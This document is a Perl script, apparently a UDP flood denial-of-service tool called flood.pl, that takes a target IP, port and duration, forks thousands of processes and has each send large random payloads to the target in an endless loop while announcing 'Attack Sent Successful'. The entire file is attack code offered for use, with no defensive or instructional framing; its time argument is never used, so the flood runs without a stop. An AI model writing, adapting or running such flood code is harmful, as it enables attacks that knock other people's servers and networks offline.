#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

my $target_ip = shift || die "Usage: perl flood.pl <ip> <port> <time>\n";
my $target_port = shift || die "Usage: perl flood.pl <ip> <port> <time>\n";
my $time = shift || die "Usage: perl flood.pl <ip> <port> <time>\n";

my $packet_size = 65535;
my $pps = 999999;
my $threads = 9999;

# Generate a random payload in hexadecimal format
sub generate_payload {
    my $length = shift;
    my @chars = ('0'..'9', 'A'..'F');
    my $payload = '';
    for (1..$length) {
        $payload .= $chars[rand @chars];
    }
    return $payload;
}

# Create multiple threads to send packets
sub send_packets {
    my $target_ip = shift;
    my $target_port = shift;
    my $packet_size = shift;
    my $pps = shift;
    my $threads = shift;

    my $payload = generate_payload($packet_size);

    for (1..$threads) {
        my $thread = fork();
        if ($thread) {
            # Parent process
            next;
        } elsif ($thread == 0) {
            # Child process
            my $socket = IO::Socket::INET->new(
                PeerAddr => $target_ip,
                PeerPort => $target_port,
                Proto => 'udp'
            ) || die "Failed to create socket: $!\n";

            while (1) {
                for (1..$pps) {
                    $socket->send($payload);
                }
                select(undef, undef, undef, 1);  # Sleep for 1 second
            }

            exit;
        } else {
            die "Failed to fork: $!\n";
        }
    }

    # Wait for all child processes to finish
    while (wait() != -1) {}

    exit;
}

print "Attack Sent Successful...\nTarget: $target_ip\nPort: $target_port\nTime: $time\n";
send_packets($target_ip, $target_port, $packet_size, $pps, $threads);